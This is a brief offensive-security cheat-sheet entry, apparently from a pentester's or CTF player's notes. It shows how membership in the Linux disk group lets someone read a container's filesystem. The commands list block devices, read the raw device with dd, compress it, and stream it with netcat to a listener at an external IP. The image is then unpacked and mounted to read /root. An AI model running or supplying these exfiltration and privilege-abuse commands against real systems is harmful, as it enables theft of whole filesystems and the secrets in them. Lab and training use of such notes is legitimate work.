---
title: "disk"
date: 2024-7-2
tags: ["disk", "mount", "backup", "privilege read", "container", "lvm"]
---

---
### Abuse disk group to read container's filesystem

```bash
# Show devices
lsblk

# Show LVM mappings
ls -l /dev/mapper/

# In our local machine
nc -lvnp 4444 > dm-0.gz

# Exfil filesystem (target container rootfs, e.g., dm-0)
dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444

# Extract dm-0
gunzip dm-0.gz

# Mount the filesystem
sudo mount dm-0-orig /mnt/ 

# Privilege read
ls /mnt/root/
```

<small>*Note: can take a long time to transfer*</small>